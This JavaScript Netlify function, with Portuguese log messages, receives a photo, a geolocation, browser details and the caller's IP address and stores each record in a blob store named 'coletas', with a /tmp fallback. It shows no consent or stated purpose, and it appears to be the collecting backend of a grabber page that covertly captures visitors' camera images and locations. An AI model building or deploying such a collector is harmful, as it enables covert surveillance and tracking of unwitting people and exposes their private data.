const { v4: uuidv4 } = require('uuid');

exports.handler = async (event) => {
    console.log('📥 Coletar: Requisição recebida');
    console.log('📋 Método:', event.httpMethod);

    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ erro: 'Método não permitido' })
        };
    }

    try {
        const dados = JSON.parse(event.body);
        const id = uuidv4();
        const dataHora = new Date().toISOString();

        console.log(`🆔 ID: ${id}`);
        console.log(`📅 Timestamp: ${dataHora}`);

        // Processa a foto
        let fotoSalva = false;
        if (dados.foto && dados.foto.startsWith('data:image')) {
            fotoSalva = true;
            console.log(`✅ Foto capturada (${Math.round(dados.foto.length / 1024)}KB)`);
        }

        // ===== SALVA NO BLOB STORE =====
        try {
            const { getStore } = require('@netlify/blobs');
            const store = getStore('coletas');
            
            const dadosParaSalvar = {
                id,
                timestamp: dataHora,
                localizacao: dados.localizacao || null,
                navegador: dados.navegador || null,
                ip: event.headers['x-forwarded-for'] || 'IP não disponível',
                foto: dados.foto || null
            };

            await store.set(id, JSON.stringify(dadosParaSalvar));
            console.log(`💾 Dados salvos com sucesso! ID: ${id}`);

        } catch (blobError) {
            console.error('❌ Erro no Blob Store:', blobError.message);
            
            // Fallback: salva no /tmp
            const fs = require('fs');
            const path = require('path');
            const dir = '/tmp/uploads';
            if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
            
            const dadosParaSalvar = {
                id,
                timestamp: dataHora,
                localizacao: dados.localizacao || null,
                navegador: dados.navegador || null,
                ip: event.headers['x-forwarded-for'] || 'IP não disponível',
                foto: dados.foto || null
            };
            
            fs.writeFileSync(
                path.join(dir, `dados_${id}.json`),
                JSON.stringify(dadosParaSalvar, null, 2)
            );
            console.log(`💾 Fallback: salvo em /tmp/dados_${id}.json`);
        }

        return {
            statusCode: 200,
            headers: {
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
            },
            body: JSON.stringify({
                status: 'success',
                id: id,
                fotoSalva: fotoSalva,
                timestamp: dataHora
            })
        };

    } catch (error) {
        console.error('💥 ERRO:', error);
        return {
            statusCode: 500,
            headers: {
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
            },
            body: JSON.stringify({ erro: error.message })
        };
    }
};
